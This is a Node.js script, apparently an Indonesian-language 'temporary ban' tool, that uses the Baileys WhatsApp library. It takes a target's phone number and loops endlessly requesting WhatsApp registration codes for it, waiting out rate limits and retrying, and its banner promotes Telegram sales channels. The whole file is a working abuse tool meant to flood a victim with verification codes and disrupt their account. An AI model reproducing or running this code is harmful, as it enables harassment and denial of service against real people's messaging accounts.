const prompt = require('prompt-sync')();
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs')

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./man/n.json'));

const start = async () => {

  const { state, saveCreds } = await useMultiFileAuthState('.rey')

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  })
  //console.clear();
  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
      console.clear();
      console.log(gradient('red', 'red')(': +' + ddi + number))
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        })
        b = (res.reason === 'temporarily_unavailable');
        if (b) {
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 1000)
          return;
        }
      } catch (error) {
        //console.log(error)
      }
    }

  }
  console.clear();
  console.log(gradient('red', 'red')('SCRIPT TEMPORARY BY :'))
  console.log(gradient('red', 'red')('█████████████████████████████████████████████████████████████████████'))
  console.log(gradient('red', 'red')('█░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░███░░░░░░░░██░░░░░░░░█░░░░░░█████████'))
  console.log(gradient('red', 'red')('█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀░░█████████'))
  console.log(gradient('red', 'red')('█░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░▄▀▄▀░░█░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░█████████'))
  console.log(gradient('red', 'red')('███░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░██░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░█████████'))
  console.log(gradient('red', 'red')('███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░██░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░█████████'))
  console.log(gradient('red', 'red')('█████░░▄▀▄▀▄▀░░█████░░▄▀░░██░░▄▀░░█████░░▄▀▄▀▄▀░░█████░░▄▀░░█████████'))
  console.log(gradient('white', 'white')('███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░██░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░█████████'))
  console.log(gradient('white', 'white')('███░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░██░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░█████████'))
  console.log(gradient('white', 'white')('█░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░▄▀▄▀░░█░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█'))
  console.log(gradient('white', 'white')('█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█'))
  console.log(gradient('white', 'white')('█░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░███░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█'))
  console.log(gradient('white', 'white')('█████████████████████████████████████████████████████████████████████'))
  console.log(gradient('red', 'red')(''))
  console.log(gradient('red', 'red')('Telegram : t.me/xdxl_store'))
  console.log(gradient('red', 'red')('Channel : t.me/xdxl_vpn'))
  console.log(gradient('red', 'red')(''))
  let ddi = prompt(gradient('cyan', 'cyan')('[+] Masukan code negara, tanpa tanda + : '));
  let number = prompt(gradient('red', 'red')('[+] Masukan Nomor target berawalan 8xxx : '))
  let phoneNumber = ddi + number;
  numbers[phoneNumber] = { ddi, number }
  fs.writeFileSync('./man/n.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number })
console.clear();
}
start();
